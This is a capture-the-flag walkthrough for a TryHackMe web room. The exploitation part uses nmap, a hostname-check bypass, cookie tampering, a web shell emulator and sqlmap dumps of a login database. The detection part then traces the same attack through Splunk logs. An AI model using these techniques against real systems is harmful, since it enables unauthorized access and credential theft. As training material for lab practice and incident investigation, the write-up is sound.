# [TryHack3M: Subscribe](https://tryhackme.com/room/subscribe)

## Can you help Hack3M reach 3M subscribers?

# Storyline

## Incident Storyline

We have good news and bad news! The good news is that we are about to hit 3 million users on our platform, and the bad news is;

Well, last night, the UnderGround (UG) Hackers attacked our website, `hackme.thm`, and took complete control. They were able to turn off the signup page, so there won't be any new registrations. Given this, our user count is stuck at `2.99 Million`.
Can you help us restore the registration panel on our site to reach our 3 million user milestone?

## Room Objectives

To assist the HackM3.thm company in fixing the application, you need to:

- Explore the web server and find the attack vectors leveraged by the attacker.
- Regain access and restore the signup functionality for the new users.
- Investigate the web application logs and track down the root cause.

# Exploitation

## Sometimes, the attacker leaves footprints that allow you to regain access to the server. Can you help HackM3 restore server access and get 3M subscribers?

### What is the invite code for the hackme.thm website?

1. Perform a full port scan with service version detection to enumerate all open ports and services on the target machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 63:c5:a6:3e:0c:15:7f:2c:bf:aa:c2:54:33:a6:ba:a5 (RSA)
|   256 51:4a:9b:e6:7f:4e:f7:0f:79:69:17:71:fc:8f:c5:29 (ECDSA)
|_  256 6c:f9:66:16:2a:4b:d2:b6:df:9e:e9:37:66:9f:65:4c (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack3M | Cyber Security Training
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
8000/tcp  open  http     Splunkd httpd
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://<TARGET_IP>:8000/en-US/account/login?return_to=%2Fen-US%2F
|_http-server-header: Splunkd
8089/tcp  open  ssl/http Splunkd httpd (free license; remote login disabled)
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2024-04-05T11:00:59
|_Not valid after:  2027-04-05T11:00:59
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Splunkd
8191/tcp  open  mongodb  MongoDB 3.6 after 3.6.3, or 3.7.3 or later
40009/tcp open  http     Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to `view-source:http://<TARGET_IP>/sign_up.php`. The source references a JavaScript file: `view-source:http://<TARGET_IP>js/invite.js`. Inspect its contents to reveal the invite code generation logic:

```js
function e() {
  var e = window.location.hostname;
  if (e === "capture3millionsubscribers.thm") {
    var o = new XMLHttpRequest();
    o.open("POST", "inviteCode1337HM.php", true);
    o.onload = function () {
      if (this.status == 200) {
        console.log("Invite Code:", this.responseText);
      } else {
        console.error("Error fetching invite code.");
      }
    };
    o.send();
  } else if (e === "hackme.thm") {
    console.log("This function does not operate on hackme.thm");
  } else {
    console.log("Lol!! Are you smart enought to get the invite code?");
  }
}
```

> The script only issues the POST request to `inviteCode1337HM.php` when the page is loaded from the `capture3millionsubscribers.thm` hostname. This is a client-side hostname check that can be bypassed by resolving that hostname to the target IP.

3. Add both virtual hostnames to `/etc/hosts` to enable name resolution to the target machine:

```bash
echo <TARGET_IP> hackme.thm capture3millionsubscribers.thm >> /etc/hosts
```

4. Navigate to `http://capture3millionsubscribers.thm/sign_up.php` and intercept the request using **Burp Suite**. When the sign-up form is submitted, Burp captures the POST to `/sign_up.php`. Modify the request path to `/inviteCode1337HM.php` and forward it. The server responds with the invite code in plaintext.

[SCREEN01]

---

### What is the password for the user guest@hackme.thm?

1. Navigate to `http://capture3millionsubscribers.thm/sign_up.php` and enter the invite code obtained in the previous step. Upon successful submission, the page returns the password for the guest account.

[SCREEN02]

---

### What is the secure token for accessing the admin panel?

1. Log in to `http://capture3millionsubscribers.thm` using g`uest@hackme.thm` and the obtained password. Using browser developer tools locate the `isVIP` session cookie and change its value from `false` to `true`. Navigate to `http://capture3millionsubscribers.thm/advanced_red_teaming.php`. View the page source to find a hidden link to a PHP file:

```js
$(document).ready(function () {
  $("#shell_commands").on("keydown", function (event) {
    if (event.which == 13) {
      // Hackme.thm emulator capable of exeuting following commands:
      // - run  <machine AMI>
      // - whoami "returns username"
      // - ls "list the files"
      // -  cat <filename> "list contents of files accessed jointly by dev and prod team"
      var cmd = $("#shell_commands").val();
      $.get("run_machine_hackme.php", { command: cmd }, function (data) {
        var output = data;
        var output = decodeHtmlEntities(data);
        $("#shell_output").text(output);
      }).fail(function () {
        $("#shell_output").text("Error executing command.");
      });

      $("#shell_commands").val("");
    }
  });
});

function decodeHtmlEntities(str) {
  return str
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&amp;/g, "&");
  // Extend with other entities as needed
}
```

> This page exposes a web-based shell emulator. Inspecting its source reveals the underlying mechanism. Commands are passed as a GET parameter to `run_machine_hackme.php`:

2. Use the shell emulator to list the files in the current web root and then read the PHP configuration file:

```bash
ls
cat config.php
```

[SCREEN03]

---

### What is the flag value after enabling the registration feature and getting 3M subscribers on the platform?

1. The `config.php` file from the previous step reveals the hidden admin subdomain `admin1337special.hackme.thm`. Add it to `/etc/hosts`:

2. The second Apache instance is running on port 40009. Run a directory brute-force to discover the available endpoints under the web root:

```bash
gobuster dir -u http://admin1337special.hackme.thm:40009/public/html/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```
login                (Status: 200) [Size: 1662]
logout               (Status: 200) [Size: 154]
dashboard            (Status: 403) [Size: 0]
```

3. Navigate to `http://admin1337special.hackme.thm:40009/public/html/login`. The page initially presents a code-entry field. Enter the secure token obtained from `config.php` to unlock the actual login form.

4. Submit a test login attempt and capture the resulting POST request to `/api/login.php` using **Burp Suite**. Save the raw HTTP request to a file:

5. Use `sqlmap` against the saved request to test for SQL injection and enumerate the available databases:

```bash
sqlmap -r request --dbs
```

**Results:**

```
available databases [6]:
[*] hackme
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys
```

6. Enumerate the tables within the `hackme` database:

```bash
sqlmap -r request -D hackme --tables
```

**Results:**

```
Database: hackme
[2 tables]
+--------+
| config |
| users  |
+--------+
```

7. Dump the `users` table to recover the admin credentials:

```bash
sqlmap -r request -D hackme -T users --dump
```

**Results:**

```
Database: hackme
Table: users
[1 entry]
+----+------------------+------------+--------+----------+--------------+----------+
| id | email            | name       | role   | status   | password     | username |
+----+------------------+------------+--------+----------+--------------+----------+
| 1  | admin@hackme.thm | Admin User | admin  | 1        | a**********n | admin    |
+----+------------------+------------+--------+----------+--------------+----------+
```

8. Log in to `http://admin1337special.hackme.thm:40009/public/html/dashboard` using the recovered admin credentials. From the navigation drop-down menu, select **Sign up** and click **Set Options** to re-enable user registration on the platform.

9. Navigate to `http://hackme.thm`. With registration re-enabled, the subscriber counter reaches 3 million and the flag is displayed on the page.

[SCREEN04]

---

# Detection

## Investigating the Attack

Our security department detected an alert about a web attack on the 4th of April, 2024. They have ingested the logs into Splunk, which can be accessed using the following credentials:

```
Username: admin
Password: splunklab
URL:      <TARGET_IP>:8000
```

Your task is to analyse the logs and track the attacker's footprints.

Good luck.

### How many logs are ingested in the Splunk instance?

1. Log in to the Splunk web interface at `http://<TARGET_IP>:8000`. Navigate to **Search & Reporting**, set the time range picker to **All time**, and run a wildcard search across all indexes: `index=*`.

The total event count is displayed in the top-left corner of the search results panel.

**Answer:** 10530

[SCREEN05]

---

### What is the web hacking tool used by the attacker to exploit the vulnerability on the website?

1. Run the same broad search and examine the sidebar on the left. Click on the `user_agent` field to see a frequency breakdown of all user agent strings present in the logs. One value stands out as a well-known automated exploitation framework.

**Answer:** sqlmap

[SCREEN06]

---

### How many total events were observed related to the attack?

1. Narrow the search to only events generated by the attacker's tool by filtering on the specific `user_agent` string identified in the previous step: `index=* user_agent="sqlmap/1.2.4#stable (http://sqlmap.org)"`.

The event count shown at the top of the results represents all log entries attributable to the automated SQL injection attack.

**Answer:** 158

[SCREEN07]

---

### What is the observed IP address of the attacker?

1. With the same query still active, inspect the `source_ip` field. A single unique IP address appears, which is the machine from which sqlmap was executed.

**Answer:** 83.45.212.17

---

### How many events were observed from the attacker's IP?

1. Broaden the search to include all activity from the attacker's IP address, regardless of user agent. This captures any manual reconnaissance or requests made before or after the automated attack: `index=* source_ip="83.45.212.17"`.

**Answer:** 184

[SCREEN08]

---

### What is the table used by the attacker to execute the attack?

1. Using the search scoped to the attacker's IP, expand the `uri` field in the sidebar. The URI values contain the raw SQL injection payloads that `sqlmap` injected into the login endpoint's parameters. Examining the payloads reveals the database table name that was targeted during the enumeration and dump phases of the attack:

**Answer:** TryHack3M_users

[SCREEN09]
